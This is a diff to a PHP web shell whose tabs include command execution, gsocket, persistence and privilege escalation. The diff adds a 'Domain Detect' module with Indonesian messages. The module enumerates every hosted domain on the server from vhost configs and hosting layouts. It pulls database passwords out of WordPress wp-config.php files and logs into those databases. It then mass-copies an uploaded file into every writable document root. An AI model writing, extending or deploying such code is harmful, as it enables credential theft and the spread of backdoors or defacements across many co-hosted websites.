@@ -646,7 +646,7 @@ $cpu = @file_get_contents('/proc/cpuinfo');
 $cores = $cpu ? substr_count($cpu, 'processor') : 0;
 $hostname = function_exists('gethostname') ? @gethostname() : '-';
 $tab = isset($_GET['tab']) ? $_GET['tab'] : '';
-if (!in_array($tab, array('shell','gs','cmd','info','upurl',''), true)) $tab = '';
+if (!in_array($tab, array('shell','gs','cmd','info','upurl','domain',''), true)) $tab = '';
 $sh_dir = __DIR__ . '/.rct_shell'; $sh_pid = "$sh_dir/pid.txt"; $sh_log = "$sh_dir/out.log"; $sh_err = "$sh_dir/err.log";
 $gs_dir    = __DIR__ . '/.rct_gsocket'; $gs_pid    = "$gs_dir/pid.txt"; $gs_log    = "$gs_dir/out.log"; $gs_secret = "$gs_dir/secret.txt"; $gs_bin    = "$gs_dir/gs-netcat";
 function gs_bin_path() { global $gs_bin; return $gs_bin; }
@@ -1397,11 +1397,629 @@ pre{white-space:pre-wrap;word-wrap:break-word;overflow:auto;}
         <a class="btn <?php echo $tab === 'cmd' ? 'active' : ''; ?>" href="?<?php echo $tab === 'cmd' ? '' : 'tab=cmd&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'cmd' ? '&#9662;' : '&#9656;'; ?> Command Execution</a>
         <a class="btn <?php echo $tab === 'info' ? 'active' : ''; ?>" href="?<?php echo $tab === 'info' ? '' : 'tab=info&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'info' ? '&#9662;' : '&#9656;'; ?> Info</a>
         <a class="btn <?php echo $tab === 'upurl' ? 'active' : ''; ?>" href="?<?php echo $tab === 'upurl' ? '' : 'tab=upurl&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'upurl' ? '&#9662;' : '&#9656;'; ?> Upload URL</a>
+        <a class="btn <?php echo $tab === 'domain' ? 'active' : ''; ?>" href="?<?php echo $tab === 'domain' ? '' : 'tab=domain&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'domain' ? '&#9662;' : '&#9656;'; ?> Domain Detect</a>
         <a class="btn <?php echo $tab_ext === 'process' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'process' ? '' : 'tab=process&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'process' ? '&#9662;' : '&#9656;'; ?> Processes</a>
         <a class="btn <?php echo $tab_ext === 'cron' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'cron' ? '' : 'tab=cron&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'cron' ? '&#9662;' : '&#9656;'; ?> Persistence</a>
         <a class="btn <?php echo $tab_ext === 'privesc' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'privesc' ? '' : 'tab=privesc&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'privesc' ? '&#9662;' : '&#9656;'; ?> Privesc</a>
     </div>
 </div>
+<?php
+$WID_SCAN_ROOTS = '';
+
+function wid_nslash($p) { return str_replace('\\', '/', (string)$p); }
+function wid_domain_like($name) { return (bool)preg_match('/^(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,63}$/i', (string)$name); }
+function wid_normalize_root($root) {
+    $root = trim((string)$root); $root = trim($root, "\"'");
+    if ($root === '') return '';
+    if (strpos($root, '${') !== false) return '';
+    $rp = @realpath($root);
+    if ($rp === false || !@is_dir($rp)) return '';
+    return $rp;
+}
+function wid_web_docroot_markers() {
+    static $m = null;
+    if ($m === null) $m = array('public_html','private_html','httpdocs','httpsdocs','htdocs','wwwroot','webroot','www','html','web');
+    return $m;
+}
+function wid_account_bucket_names() {
+    static $b = null;
+    if ($b === null) $b = array('domains','web','sites','vhosts','subsites','httpdocs','httpsdocs');
+    return $b;
+}
+function wid_domain_skip_home() {
+    static $s = null;
+    if ($s === null) $s = array('domains'=>1,'web'=>1,'sites'=>1,'vhosts'=>1,'subsites'=>1,'clients'=>1,'mail'=>1,'ssl'=>1,'tmp'=>1,'temp'=>1,'logs'=>1,'log'=>1,'cache'=>1,'caches'=>1,'backup'=>1,'backups'=>1,'public_html'=>1,'private_html'=>1,'httpdocs'=>1,'httpsdocs'=>1,'htdocs'=>1,'www'=>1,'html'=>1,'etc'=>1,'perl5'=>1,'bin'=>1,'php'=>1,'node_modules'=>1,'vendor'=>1,'sessions'=>1,'lscache'=>1);
+    return $s;
+}
+function wid_domain_skip_nested() {
+    static $s = null;
+    if ($s === null) $s = array('files'=>1,'plugins'=>1,'public'=>1,'assets'=>1,'vendor'=>1,'node_modules'=>1,'cache'=>1,'caches'=>1,'tmp'=>1,'temp'=>1,'logs'=>1,'log'=>1,'mail'=>1,'ssl'=>1,'backup'=>1,'backups'=>1,'wp-admin'=>1,'wp-content'=>1,'wp-includes'=>1,'cgi-bin'=>1,'includes'=>1,'admin'=>1,'api'=>1,'cron'=>1);
+    return $s;
+}
+function wid_hosting_docroot_domain($path) {
+    static $patterns = null;
+    if ($patterns === null) {
+        $m = implode('|', wid_web_docroot_markers());
+        $b = 'domains|web|sites|subsites';
+        $patterns = array(
+            '#/(?:'.$b.')/([^/]+)/(?:public_html|private_html|httpdocs|httpsdocs)$#i',
+            '#/(?:vhosts|var/www/vhosts)/([^/]+)/(?:'.$m.')$#i',
+            '#/(?:vhosts|var/www/vhosts)/([^/]+)$#i',
+            '#/(?:'.$b.')/[^/]+/public_html/([^/]+)/(?:html|public_html|htdocs|httpdocs|wwwroot|webroot|www|web)$#i',
+            '#/(?:'.$b.')/[^/]+/private_html/([^/]+)/(?:html|public_html|htdocs|httpdocs|web)$#i',
+            '#/home(?:\d+)?/[^/]+/([^/]+)/(?:'.$m.')$#i',
+            '#/home(?:\d+)?/[^/]+/(?:'.$b.')/([^/]+)/(?:'.$m.')$#i',
+            '#/var/www/[^/]+/([^/]+)/(?:'.$m.')$#i',
+            '#/var/www/[^/]+/([^/]+)$#i',
+            '#/var/www/html/([^/]+)/(?:'.$m.')$#i',
+            '#/var/www/html/([^/]+)$#i',
+            '#/(?:srv/(?:www|http)|usr/local/www)/[^/]+/([^/]+)/(?:'.$m.')$#i',
+            '#/(?:srv/(?:www|http)|usr/local/www)/[^/]+/([^/]+)$#i',
+            '#/htdocs/[^/]+/([^/]+)/(?:'.$m.')$#i',
+            '#/htdocs/[^/]+/([^/]+)$#i',
+            '#/customers/[^/]+/([^/]+)/(?:'.$m.')$#i',
+            '#/customers/[^/]+/([^/]+)$#i',
+        );
+    }
+    $p = rtrim(wid_nslash($path), '/');
+    foreach ($patterns as $pattern) {
+        if (preg_match($pattern, $p, $match) && wid_domain_like($match[1])) return strtolower($match[1]);
+    }
+    if (wid_is_account_public_html($p) && isset($_SERVER['SERVER_NAME'])) {
+        $sn = strtolower(preg_replace('/:\d+$/', '', (string)$_SERVER['SERVER_NAME']));
+        if (wid_domain_like($sn)) return $sn;
+    }
+    return '';
+}
+function wid_is_account_public_html($path) {
+    $p = rtrim(wid_nslash($path), '/');
+    return (bool)preg_match('#/(?:home(?:\d+)?|var/www|srv/(?:www|http)|usr/local/www|htdocs|customers)/[^/]+/public_html$#i', $p);
+}
+function wid_is_main_public_html($path) {
+    $p = rtrim(wid_nslash($path), '/');
+    if (preg_match('#/(?:domains|web|sites|subsites)/[^/]+/public_html$#i', $p)) return true;
+    return wid_is_account_public_html($p);
+}
+function wid_looks_like_webroot($dir) {
+    $d = rtrim((string)$dir, '/\\');
+    return @is_file($d . DIRECTORY_SEPARATOR . 'index.php')
+        || @is_file($d . DIRECTORY_SEPARATOR . 'index.html')
+        || @is_file($d . DIRECTORY_SEPARATOR . 'index.htm')
+        || @is_file($d . DIRECTORY_SEPARATOR . 'wp-config.php')
+        || @is_file($d . DIRECTORY_SEPARATOR . '.htaccess')
+        || @is_file($d . DIRECTORY_SEPARATOR . 'web.config');
+}
+function wid_guess_domain_from_path($path) {
+    $parts = explode('/', rtrim(wid_nslash($path), '/'));
+    for ($i = count($parts) - 1; $i >= 0; $i--) {
+        if ($parts[$i] !== '' && wid_domain_like($parts[$i])) return strtolower($parts[$i]);
+    }
+    return '';
+}
+function wid_account_home_patterns() {
+    static $p = null;
+    if ($p === null) $p = array('#^(/home(?:\d+)?/[^/]+)#','#^(/var/www/[^/]+)#','#^(/srv/(?:www|http)/[^/]+)#','#^(/usr/local/www/[^/]+)#','#^(/htdocs/[^/]+)#','#^(/customers/[^/]+)#');
+    return $p;
+}
+function wid_account_home_candidates_from_path($path) {
+    $out = array(); $seen = array();
+    $p = rtrim(wid_nslash((string)$path), '/');
+    for ($i = 0; $i < 10 && $p !== '' && $p !== '/'; $i++) {
+        foreach (wid_account_home_patterns() as $pattern) {
+            if (preg_match($pattern, $p, $m)) {
+                $cand = $m[1];
+                if (!isset($seen[$cand])) { $seen[$cand] = true; $out[] = $cand; }
+            }
+        }
+        $parent = dirname($p);
+        if ($parent === $p) break;
+        $p = wid_nslash($parent);
+    }
+    return $out;
+}
+function wid_add_domain_root(&$found, $path, $source, $currentRoot, $names = array()) {
+    $real = @realpath($path);
+    if ($real === false || !@is_dir($real)) return;
+    $key = wid_nslash($real);
+    if (DIRECTORY_SEPARATOR === '\\') $key = strtolower($key);
+    if (isset($found[$key])) {
+        if ($source === 'current') $found[$key]['current'] = 1;
+        foreach ($names as $n) {
+            $n = strtolower((string)$n);
+            if (wid_domain_like($n) && !in_array($n, $found[$key]['names'])) array_unshift($found[$key]['names'], $n);
+        }
+        if (!in_array($source, $found[$key]['source'])) $found[$key]['source'][] = $source;
+        return;
+    }
+    $names2 = array();
+    foreach ($names as $n) {
+        $n = strtolower((string)$n);
+        if (wid_domain_like($n) && !in_array($n, $names2)) $names2[] = $n;
+    }
+    if (!$names2) {
+        $dm = wid_hosting_docroot_domain($real);
+        if (wid_domain_like($dm)) $names2[] = $dm;
+    }
+    if (!$names2) return;
+    $found[$key] = array('path'=>$real,'names'=>$names2,'source'=>array($source),'current'=>(($currentRoot !== false) && wid_nslash($real) === wid_nslash($currentRoot)) ? 1 : 0);
+}
+function wid_scan_domain_children(&$found, $basePath, $currentRoot, $source, $skip = array()) {
+    $real = @realpath($basePath);
+    if ($real === false || !@is_dir($real) || !@is_readable($real)) return;
+    $names = @scandir($real);
+    if ($names === false) return;
+    foreach ($names as $name) {
+        if ($name === '.' || $name === '..' || $name === '' || $name[0] === '.') continue;
+        if ($skip && isset($skip[strtolower($name)])) continue;
+        if (!wid_domain_like($name)) continue;
+        $hostDir = $real . DIRECTORY_SEPARATOR . $name;
+        if (!@is_dir($hostDir) || @is_link($hostDir)) continue;
+        $added = false;
+        foreach (wid_web_docroot_markers() as $marker) {
+            $candidate = $hostDir . DIRECTORY_SEPARATOR . $marker;
+            if (@is_dir($candidate) && !@is_link($candidate)) {
+                wid_add_domain_root($found, $candidate, $source, $currentRoot, array($name));
+                $added = true; break;
+            }
+        }
+        if (!$added && wid_looks_like_webroot($hostDir)) {
+            wid_add_domain_root($found, $hostDir, $source . '-root', $currentRoot, array($name));
+        }
+    }
+}
+function wid_scan_account_home(&$found, $scanHome, $currentRoot) {
+    foreach (wid_account_bucket_names() as $bucket) {
+        wid_scan_domain_children($found, $scanHome . DIRECTORY_SEPARATOR . $bucket, $currentRoot, $bucket . '-dir');
+    }
+    wid_scan_domain_children($found, $scanHome, $currentRoot, 'home-domain-folder', wid_domain_skip_home());
+    foreach (wid_web_docroot_markers() as $marker) {
+        $direct = $scanHome . DIRECTORY_SEPARATOR . $marker;
+        if (!@is_dir($direct) || @is_link($direct)) continue;
+        wid_add_domain_root($found, $direct, 'account-' . $marker, $currentRoot);
+        if ($marker === 'public_html') {
+            wid_scan_domain_children($found, $direct, $currentRoot, 'nested-subdomain', wid_domain_skip_nested());
+        }
+    }
+}
+function wid_hosting_layout_scan(&$found, $scanHome, $currentRoot) {
+    $skipNames = array('node_modules'=>1,'vendor'=>1,'cache'=>1,'caches'=>1,'tmp'=>1,'temp'=>1,'logs'=>1,'log'=>1,'mail'=>1,'ssl'=>1,'backups'=>1,'backup'=>1,'sessions'=>1,'proc'=>1,'clients'=>1,'lscache'=>1);
+    $queue = array(array($scanHome, 0));
+    $seen = array(); $visited = 0; $maxVisited = 2000; $maxDepth = 7;
+    $bfsStart = microtime(true);
+    while (count($queue) && $visited < $maxVisited) {
+        if (($visited % 50) === 0 && ((microtime(true) - $bfsStart) > 25 || (isset($GLOBALS['WID_SCAN_DEADLINE']) && microtime(true) > $GLOBALS['WID_SCAN_DEADLINE']))) break;
+        $item = array_shift($queue); $dir = $item[0]; $depth = $item[1];
+        $realDir = @realpath($dir);
+        if ($realDir === false || !@is_dir($realDir) || !@is_readable($realDir)) continue;
+        $seenKey = wid_nslash($realDir);
+        if (DIRECTORY_SEPARATOR === '\\') $seenKey = strtolower($seenKey);
+        if (isset($seen[$seenKey])) continue;
+        $seen[$seenKey] = true; $visited++;
+        $layoutDomain = wid_hosting_docroot_domain($realDir);
+        if ($layoutDomain !== '') {
+            wid_add_domain_root($found, $realDir, 'hosting-layout', $currentRoot, array($layoutDomain));
+            if (wid_is_main_public_html($realDir)) wid_scan_domain_children($found, $realDir, $currentRoot, 'nested-subdomain', wid_domain_skip_nested());
+            continue;
+        }
+        if ($depth >= $maxDepth) continue;
+        $names = @scandir($realDir); if ($names === false) continue;
+        foreach ($names as $name) {
+            if ($name === '.' || $name === '..' || $name === '' || $name[0] === '.') continue;
+            if (isset($skipNames[strtolower($name)])) continue;
+            $child = $realDir . DIRECTORY_SEPARATOR . $name;
+            if (@is_dir($child) && !@is_link($child)) $queue[] = array($child, $depth + 1);
+        }
+    }
+}
+function wid_conf_vhosts() {
+    $out = array();
+    $dirs = array('/etc/apache2/sites-enabled','/etc/apache2/sites-available','/etc/apache2/vhosts.d','/etc/httpd/conf.d','/etc/httpd/vhosts.d','/etc/httpd/sites-enabled','/etc/nginx/sites-enabled','/etc/nginx/sites-available','/etc/nginx/conf.d','/etc/lighttpd/conf-enabled','/usr/local/etc/apache24/Includes');
+    $files = array();
+    foreach ($dirs as $d) {
+        if (!@is_dir($d)) continue;
+        $e = @scandir($d); if (!is_array($e)) continue;
+        foreach ($e as $f) {
+            if ($f === '.' || $f === '..') continue;
+            $p = $d . '/' . $f;
+            if (@is_file($p) && !@is_link($p)) $files[] = $p;
+            if (count($files) >= 200) break 2;
+        }
+    }
+    foreach (array('/etc/apache2/apache2.conf','/etc/httpd/conf/httpd.conf','/etc/apache2/httpd.conf') as $p) if (@is_file($p)) $files[] = $p;
+    foreach ($files as $p) wid_parse_vhost_file($p, $out);
+    return $out;
+}
+function wid_parse_vhost_file($path, &$out) {
+    $c = @file_get_contents($path);
+    if (!is_string($c) || $c === '' || strlen($c) > 1048576) return;
+    $lines = explode("\n", $c); $root = ''; $names = array();
+    foreach ($lines as $ln) {
+        $ln = trim($ln);
+        if ($ln === '' || $ln[0] === '#') continue;
+        if (stripos($ln, 'DocumentRoot') !== false && preg_match('/DocumentRoot\s+["\']?([^"\'#\s]+)/i', $ln, $m)) $root = $m[1];
+        if (preg_match('/^\s*ServerName\s+["\']?([^"\'\s]+)/i', $ln, $m)) {
+            $h = strtolower($m[1]);
+            if (wid_domain_like($h) && !in_array($h, $names)) $names[] = $h;
+        }
+        if (preg_match('/^\s*ServerAlias\s+(.+)$/i', $ln, $m)) {
+            foreach (preg_split('/\s+/', trim($m[1])) as $h) {
+                $h = strtolower(trim($h, "\"' \t"));
+                if (wid_domain_like($h) && !in_array($h, $names)) $names[] = $h;
+            }
+        }
+        if (stripos($ln, 'server_name') !== false && preg_match('/^\s*server_name\s+(.+?);/i', $ln, $m)) {
+            foreach (preg_split('/\s+/', trim($m[1])) as $h) {
+                if (wid_domain_like($h) && !in_array($h, $names)) $names[] = $h;
+            }
+        }
+        if (stripos($ln, 'root') !== false && preg_match('/^\s*root\s+["\']?([^"\';#]+)/i', $ln, $m)) $root = trim($m[1]);
+    }
+    $root = wid_normalize_root($root);
+    if ($root === '' || !$names) return;
+    $out[] = array('root'=>$root,'names'=>$names,'source'=>'conf');
+}
+function wid_wp_config_domains($roots) {
+    $out = array(); $configs = array();
+    $seen = array(); $visited = 0;
+    $skipNames = array('node_modules'=>1,'vendor'=>1,'cache'=>1,'caches'=>1,'tmp'=>1,'temp'=>1,'logs'=>1,'log'=>1,'mail'=>1,'ssl'=>1,'backups'=>1,'backup'=>1,'lscache'=>1);
+    foreach ($roots as $root) {
+        if (count($configs) >= 25) break;
+        $root = trim((string)$root); if ($root === '') continue;
+        $queue = array(array($root, 0));
+        while (count($queue)) {
+            if (count($configs) >= 25) break;
+            if (isset($GLOBALS['WID_SCAN_DEADLINE']) && microtime(true) > $GLOBALS['WID_SCAN_DEADLINE']) break;
+            $item = array_shift($queue); $dir = $item[0]; $depth = $item[1];
+            $realDir = @realpath($dir);
+            if ($realDir === false || !@is_dir($realDir) || !@is_readable($realDir)) continue;
+            $key = wid_nslash($realDir);
+            if (DIRECTORY_SEPARATOR === '\\') $key = strtolower($key);
+            if (isset($seen[$key])) continue;
+            $seen[$key] = true;
+            if (++$visited > 1500) break 2;
+            $cfg = $realDir . DIRECTORY_SEPARATOR . 'wp-config.php';
+            if (@is_file($cfg)) $configs[$cfg] = $realDir;
+            if ($depth >= 4) continue;
+            $names = @scandir($realDir); if ($names === false) continue;
+            foreach ($names as $name) {
+                if ($name === '.' || $name === '..' || $name === '' || $name[0] === '.') continue;
+                if (isset($skipNames[strtolower($name)])) continue;
+                $child = $realDir . DIRECTORY_SEPARATOR . $name;
+                if (@is_dir($child) && !@is_link($child)) $queue[] = array($child, $depth + 1);
+            }
+        }
+    }
+    $probes = 0;
+    foreach ($configs as $cfg => $docroot) {
+        if ($probes >= 12) break;
+        if (isset($GLOBALS['WID_SCAN_DEADLINE']) && microtime(true) > $GLOBALS['WID_SCAN_DEADLINE']) break;
+        foreach (wid_wp_domains_from_config($cfg, $docroot, $probes) as $d) $out[] = array('root'=>$docroot,'names'=>array($d),'source'=>'wp');
+    }
+    return $out;
+}
+function wid_wp_domains_from_config($file, $docroot, &$probes) {
+    $domains = array();
+    $c = @file_get_contents($file);
+    if (!is_string($c) || $c === '' || strlen($c) > 1048576) return $domains;
+    $dbname = $dbuser = $dbpass = $dbhost = $prefix = '';
+    if (preg_match("/DB_NAME\s*,\s*['\"]([^'\"]+)['\"]/", $c, $m)) $dbname = $m[1];
+    if (preg_match("/DB_USER\s*,\s*['\"]([^'\"]+)['\"]/", $c, $m)) $dbuser = $m[1];
+    if (preg_match("/DB_PASSWORD\s*,\s*['\"]([^'\"]*)['\"]/", $c, $m)) $dbpass = $m[1];
+    if (preg_match("/DB_HOST\s*,\s*['\"]([^'\"]+)['\"]/", $c, $m)) $dbhost = $m[1];
+    if (preg_match("/table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $c, $m)) $prefix = $m[1];
+    if ($prefix === '') $prefix = 'wp_';
+    if ($dbname !== '' && $dbuser !== '') {
+        $probes++;
+        foreach (wid_wp_db_domains($dbname, $dbuser, $dbpass, $dbhost, $prefix) as $d) if (!in_array($d, $domains)) $domains[] = $d;
+    }
+    if (!$domains) {
+        foreach (array(basename($docroot), basename(dirname($docroot))) as $h) {
+            if (wid_domain_like($h) && !in_array(strtolower($h), $domains)) $domains[] = strtolower($h);
+        }
+    }
+    return $domains;
+}
+function wid_wp_db_domains($db, $u, $p, $h, $prefix) {
+    static $downHosts = array();
+    $domains = array();
+    $h = ($h === '') ? 'localhost' : $h;
+    $hkey = strtolower($h);
+    if (isset($downHosts[$hkey])) return $domains;
+    $down = false;
+    try {
+        if (class_exists('PDO')) {
+            try {
+                $pdo = @new PDO('mysql:host=' . $h . ';dbname=' . $db . ';charset=utf8', $u, $p, array(PDO::ATTR_TIMEOUT => 2, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
+                $tbl = '';
+                $st = $pdo->query('SHOW TABLES LIKE ' . $pdo->quote($prefix . 'options'));
+                if ($st) { $row = $st->fetch(PDO::FETCH_NUM); if ($row) $tbl = (string)$row[0]; }
+                if ($tbl === '') {
+                    foreach ($pdo->query('SHOW TABLES', PDO::FETCH_NUM) as $row) {
+                        $t = (string)$row[0];
+                        if (preg_match('/^[A-Za-z0-9_]+options$/', $t)) { $tbl = $t; break; }
+                    }
+                }
+                if ($tbl !== '') {
+                    $st2 = $pdo->prepare('SELECT option_value FROM `' . $tbl . '` WHERE option_name IN ("home","siteurl") LIMIT 2');
+                    $st2->execute();
+                    foreach ($st2->fetchAll(PDO::FETCH_ASSOC) as $r2) {
+                        $host = @parse_url($r2['option_value'], PHP_URL_HOST);
+                        if ($host && wid_domain_like($host) && !in_array($host, $domains)) $domains[] = $host;
+                    }
+                }
+            } catch (Exception $e) {
+                if (in_array((int)$e->getCode(), array(2002,2003,2004,2005,2006))) $down = true;
+            }
+        }
+    } catch (Exception $e) {}
+    if (!$domains && !$down && function_exists('mysqli_connect')) {
+        try {
+            $m = @mysqli_init();
+            if ($m) {
+                @mysqli_options($m, MYSQLI_OPT_CONNECT_TIMEOUT, 2);
+                if (@mysqli_real_connect($m, $h, $u, $p, $db)) {
+                    $tbl = '';
+                    $res = @mysqli_query($m, 'SHOW TABLES');
+                    if ($res) {
+                        while ($row = @mysqli_fetch_row($res)) {
+                            $t = (string)$row[0];
+                            if (preg_match('/^[A-Za-z0-9_]+options$/', $t) && (strpos($t, $prefix) === 0 || $prefix === '')) { $tbl = $t; break; }
+                        }
+                    }
+                    if ($tbl !== '') {
+                        $res2 = @mysqli_query($m, 'SELECT option_value FROM `' . $tbl . '` WHERE option_name IN ("home","siteurl") LIMIT 2');
+                        if ($res2) {
+                            while ($row2 = @mysqli_fetch_row($res2)) {
+                                $host = @parse_url((string)$row2[0], PHP_URL_HOST);
+                                if ($host && wid_domain_like($host) && !in_array($host, $domains)) $domains[] = $host;
+                            }
+                        }
+                    }
+                    @mysqli_close($m);
+                } else {
+                    $errno = @mysqli_connect_errno();
+                    if (in_array((int)$errno, array(2002,2003,2004,2005,2006))) $down = true;
+                }
+            }
+        } catch (Exception $e) {}
+    }
+    if ($down) $downHosts[$hkey] = true;
+    return $domains;
+}
+function wid_detect_domains() {
+    global $WID_SCAN_ROOTS;
+    if (function_exists('set_time_limit')) @set_time_limit(120);
+    if (function_exists('ini_set')) @ini_set('default_socket_timeout', '5');
+    $GLOBALS['WID_SCAN_DEADLINE'] = microtime(true) + 20.0;
+    $found = array();
+    $currentRoot = false;
+    foreach (array('DOCUMENT_ROOT','CONTEXT_DOCUMENT_ROOT') as $envKey) {
+        if (!empty($_SERVER[$envKey])) {
+            $r = @realpath($_SERVER[$envKey]);
+            if ($r !== false && @is_dir($r)) {
+                if ($currentRoot === false) $currentRoot = $r;
+                wid_add_domain_root($found, $r, 'current', $currentRoot);
+            }
+        }
+    }
+    if ($currentRoot === false) {
+        $self = @realpath(dirname(__FILE__));
+        if ($self !== false) { $currentRoot = $self; wid_add_domain_root($found, $self, 'script', $currentRoot); }
+    }
+    foreach (wid_conf_vhosts() as $s) wid_add_domain_root($found, $s['root'], 'conf', $currentRoot, $s['names']);
+    $homeCandidates = array();
+    if (function_exists('getenv')) { $envHome = @getenv('HOME'); if ($envHome) $homeCandidates[] = $envHome; }
+    if (!empty($_SERVER['HOME'])) $homeCandidates[] = $_SERVER['HOME'];
+    foreach (array($currentRoot, @realpath(dirname(__FILE__))) as $hint) {
+        if ($hint === false || $hint === null || $hint === '') continue;
+        foreach (wid_account_home_candidates_from_path($hint) as $cand) $homeCandidates[] = $cand;
+    }
+    if ($WID_SCAN_ROOTS !== '') {
+        foreach (explode(',', $WID_SCAN_ROOTS) as $cfgRoot) {
+            $cfgRoot = trim($cfgRoot);
+            if ($cfgRoot !== '') $homeCandidates[] = $cfgRoot;
+        }
+    }
+    $scanHomes = array(); $seenHomes = array();
+    foreach ($homeCandidates as $home) {
+        $home = trim((string)$home); if ($home === '') continue;
+        $r = @realpath($home);
+        if ($r === false || !@is_dir($r) || !@is_readable($r)) continue;
+        $key = wid_nslash($r);
+        if (DIRECTORY_SEPARATOR === '\\') $key = strtolower($key);
+        if (isset($seenHomes[$key])) continue;
+        $seenHomes[$key] = true; $scanHomes[] = $r;
+    }
+    $wpScanRoots = array();
+    if ($currentRoot !== false) $wpScanRoots[] = $currentRoot;
+    $selfDir = @realpath(dirname(__FILE__));
+    if ($selfDir !== false) $wpScanRoots[] = $selfDir;
+    foreach ($found as $f) $wpScanRoots[] = $f['path'];
+    foreach ($scanHomes as $sh) $wpScanRoots[] = $sh;
+    foreach (wid_wp_config_domains($wpScanRoots) as $s) wid_add_domain_root($found, $s['root'], 'wp', $currentRoot, $s['names']);
+    foreach ($scanHomes as $scanHome) {
+        wid_scan_account_home($found, $scanHome, $currentRoot);
+        wid_hosting_layout_scan($found, $scanHome, $currentRoot);
+    }
+    $rows = array();
+    foreach ($found as $key => $entry) {
+        if (!$entry['names']) continue;
+        $rows[] = array(
+            'domain'=>$entry['names'][0],
+            'aliases'=>array_slice($entry['names'], 1),
+            'docroot'=>$entry['path'],
+            'writable'=>@is_writable($entry['path']),
+            'readable'=>@is_readable($entry['path']),
+            'source'=>implode(',', $entry['source']),
+            'current'=>$entry['current'],
+        );
+        if (count($rows) >= 150) break;
+    }
+    usort($rows, function ($a, $b) {
+        if ($a['current'] !== $b['current']) return $b['current'] - $a['current'];
+        return strcmp($a['domain'], $b['domain']);
+    });
+    return $rows;
+}
+function wid_deploy_file($src, $name, $rows) {
+    $report = array();
+    $name = basename($name);
+    if ($name === '' || $name === '.' || $name === '..') {
+        $report[] = array('domain'=>'-','url'=>'-','docroot'=>'-','status'=>'gagal','detail'=>'Nama file tujuan tidak valid.');
+        return $report;
+    }
+    $srcReal = @realpath($src);
+    $seen = array(); $seenDom = array();
+    foreach ($rows as $row) {
+        $dom = (string)$row['domain'];
+        $url = ($dom !== '' && $dom !== '-') ? $dom . '/' . $name : '-';
+        $domKey = strtolower(trim($dom));
+        if ($domKey !== '' && isset($seenDom[$domKey])) continue;
+        if ($domKey !== '') $seenDom[$domKey] = true;
+        $rp = wid_normalize_root($row['docroot']);
+        if ($rp === '') {
+            $report[] = array('domain'=>$dom,'url'=>$url,'docroot'=>$row['docroot'],'status'=>'gagal','detail'=>'Docroot tidak valid/tidak ada.');
+            continue;
+        }
+        if (isset($seen[$rp])) continue;
+        $seen[$rp] = true;
+        $dest = $rp . DIRECTORY_SEPARATOR . $name;
+        $destReal = @realpath($dest);
+        if ($destReal !== false && $srcReal !== false && $destReal === $srcReal) {
+            $report[] = array('domain'=>$dom,'url'=>$url,'docroot'=>$rp,'status'=>'skip','detail'=>'File sumber itu sendiri.');
+            continue;
+        }
+        if (!@is_dir($rp)) {
+            $report[] = array('domain'=>$dom,'url'=>$url,'docroot'=>$rp,'status'=>'gagal','detail'=>'Docroot bukan direktori.');
+            continue;
+        }
+        if (!@is_writable($rp)) {
+            $report[] = array('domain'=>$dom,'url'=>$url,'docroot'=>$rp,'status'=>'gagal','detail'=>'Docroot tidak writable.');
+            continue;
+        }
+        $existed = @file_exists($dest);
+        if (!@copy($src, $dest)) {
+            $report[] = array('domain'=>$dom,'url'=>$url,'docroot'=>$rp,'status'=>'gagal','detail'=>'copy() gagal (permission/disk).');
+            continue;
+        }
+        $report[] = array('domain'=>$dom,'url'=>$url,'docroot'=>$rp,'status'=>'ok','detail'=>$existed ? 'ditimpa' : 'baru');
+    }
+    return $report;
+}
+
+// Handler
+$domain_rows = array(); $domain_scan_done = false;
+$deploy_done = false; $deploy_summary = ''; $deploy_report = array(); $detect_error = '';
+
+if (isset($_POST['action']) && $_POST['action'] === 'domain_detect') {
+    try { $domain_rows = wid_detect_domains(); $domain_scan_done = true; }
+    catch (Exception $e) { $detect_error = 'Scan domain gagal: ' . $e->getMessage(); }
+    catch (Throwable $e) { $detect_error = 'Scan domain gagal (' . get_class($e) . '): ' . $e->getMessage(); }
+}
+if (isset($_POST['action']) && $_POST['action'] === 'deploy_massal') {
+    try { $domain_rows = wid_detect_domains(); $domain_scan_done = true; }
+    catch (Exception $e) { $detect_error = 'Scan domain gagal: ' . $e->getMessage(); }
+    catch (Throwable $e) { $detect_error = 'Scan domain gagal (' . get_class($e) . '): ' . $e->getMessage(); }
+    $deploy_done = true;
+    if ($detect_error === '' && isset($_FILES['deploy_file']) && is_array($_FILES['deploy_file']) && $_FILES['deploy_file']['error'] === UPLOAD_ERR_OK) {
+        $df = $_FILES['deploy_file'];
+        $dname = basename($df['name']);
+        $deploy_report = wid_deploy_file($df['tmp_name'], $dname, $domain_rows);
+        $okN = 0; $failN = 0;
+        foreach ($deploy_report as $dr) { if ($dr['status'] === 'ok') $okN++; else $failN++; }
+        $deploy_summary = 'Deploy "' . h($dname) . '": ' . $okN . ' target ok, ' . $failN . ' gagal/skip dari ' . count($deploy_report) . ' tujuan unik.';
+    } elseif ($detect_error === '') {
+        $err = isset($_FILES['deploy_file']) ? (int)$_FILES['deploy_file']['error'] : 4;
+        $deploy_summary = 'Upload gagal (kode error ' . $err . '). Pilih file dulu.';
+    }
+}
+?>
+<?php if ($tab === 'domain'): ?>
+<div class="box">
+    <div class="name">Domain Detect</div>
+    <div class="muted" style="margin-bottom:10px;">
+        Scan vhost Apache/Nginx, layout hosting (domains/web/sites/vhosts per akun home), dan <code>wp-config.php</code> (probe DB home/siteurl).
+        Budget 20 detik, tanpa symlink, dedupe per realpath docroot. Tambah path scan lewat <code>$WID_SCAN_ROOTS</code> di awal file.
+    </div>
+    <form method="post">
+        <input type="hidden" name="action" value="domain_detect">
+        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
+        <input type="submit" class="btn btn-green" value="Deteksi Domain">
+    </form>
